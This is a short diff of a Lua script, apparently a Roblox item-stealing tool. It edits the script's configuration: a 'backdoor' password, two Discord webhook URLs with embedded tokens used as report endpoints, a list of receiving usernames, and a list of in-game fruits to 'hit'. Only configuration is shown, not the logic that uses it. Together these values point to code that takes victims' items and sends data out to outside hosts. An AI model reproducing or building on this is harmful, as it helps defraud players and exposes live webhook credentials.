@@ -22,7 +22,7 @@ local BackdoorPassword = "ishusinthere" -- Configurable Backdoor Password
 
 local DEFAULT_MAIN_WEBHOOK = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- !! REPLACE WITH A REAL FALLBACK MAIN URL !!
 local DEFAULT_DUMMY_WEBHOOK = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- !! REPLACE WITH A REAL FALLBACK DUMMY URL !!
-local DEFAULT_USERNAMES = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xrip_cyborg"}
+local DEFAULT_USERNAMES = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal50", "xrip_cyborg"}
 local DEFAULT_FRUITS_TO_HIT = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon(East)", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard"}
 
 if Webhook == "YOUR_MAIN_WEBHOOK_URL_HERE" or Webhook == nil or type(Webhook) ~= "string" then Webhook = DEFAULT_MAIN_WEBHOOK end
